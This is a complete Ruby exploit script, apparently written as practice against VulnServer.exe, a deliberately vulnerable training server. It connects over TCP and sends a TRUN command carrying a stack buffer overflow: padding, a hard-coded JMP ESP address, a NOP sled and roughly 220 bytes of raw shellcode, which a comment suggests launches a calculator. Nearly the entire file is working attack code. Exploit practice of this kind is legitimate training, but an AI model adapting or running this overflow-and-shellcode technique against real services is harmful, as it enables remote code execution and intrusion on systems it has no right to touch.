#! /usr/bin/env ruby
# VulnServer.exe Exploit
# 
# Usage ./vulnserv.rb <IP> <PORT> <PAYLOAD FILE>
#
require 'socket'

# Check arguments
if ARGV.length < 3
  puts "usage #{__FILE__} <target ip> <target port> <payload file>"
  exit
end

# Create the socket
IP=ARGV[0]
PORT=ARGV[1]
FILE = ARGV[2]

puts "[+] Connecting..."
s = TCPSocket.new(IP, PORT)

# Define command
cmd = "TRUN"

# Define payload
payload = " /.:/"
#payload += File.read(FILE)
payload += "A" * 2003 # Padding
payload += "\xaf\x11\x50\x62" # JMP ESP
payload += "\x90" * 32 # NOP Sled
payload +=  # Shellcode 220bytes (I really could use a calculator...)
  "\xba\xb3\xa7\x9b\xb8\xdb\xc4\xd9\x74\x24\xf4\x5d\x31\xc9" +
  "\xb1\x31\x31\x55\x13\x83\xc5\x04\x03\x55\xbc\x45\x6e\x44" +
  "\x2a\x0b\x91\xb5\xaa\x6c\x1b\x50\x9b\xac\x7f\x10\x8b\x1c" +
  "\x0b\x74\x27\xd6\x59\x6d\xbc\x9a\x75\x82\x75\x10\xa0\xad" +
  "\x86\x09\x90\xac\x04\x50\xc5\x0e\x35\x9b\x18\x4e\x72\xc6" +
  "\xd1\x02\x2b\x8c\x44\xb3\x58\xd8\x54\x38\x12\xcc\xdc\xdd" +
  "\xe2\xef\xcd\x73\x79\xb6\xcd\x72\xae\xc2\x47\x6d\xb3\xef" +
  "\x1e\x06\x07\x9b\xa0\xce\x56\x64\x0e\x2f\x57\x97\x4e\x77" +
  "\x5f\x48\x25\x81\x9c\xf5\x3e\x56\xdf\x21\xca\x4d\x47\xa1" +
  "\x6c\xaa\x76\x66\xea\x39\x74\xc3\x78\x65\x98\xd2\xad\x1d" +
  "\xa4\x5f\x50\xf2\x2d\x1b\x77\xd6\x76\xff\x16\x4f\xd2\xae" +
  "\x27\x8f\xbd\x0f\x82\xdb\x53\x5b\xbf\x81\x39\x9a\x4d\xbc" +
  "\x0f\x9c\x4d\xbf\x3f\xf5\x7c\x34\xd0\x82\x80\x9f\x95\x7d" +
  "\xcb\x82\xbf\x15\x92\x56\x82\x7b\x25\x8d\xc0\x85\xa6\x24" +
  "\xb8\x71\xb6\x4c\xbd\x3e\x70\xbc\xcf\x2f\x15\xc2\x7c\x4f" +
  "\x3c\xa1\xe3\xc3\xdc\x08\x86\x63\x46\x55"
payload += "\x90" * (5000 - 2003 - 4 - 32 - 220)

# Send the payload
begin
  s.gets
  puts "[+] Sending payload.."
  s.puts(cmd + payload)
  s.gets
  puts "[-] Failed to crash the target"
  s.close
rescue Errno::ECONNRESET
  puts "[+] Crash!!"
end

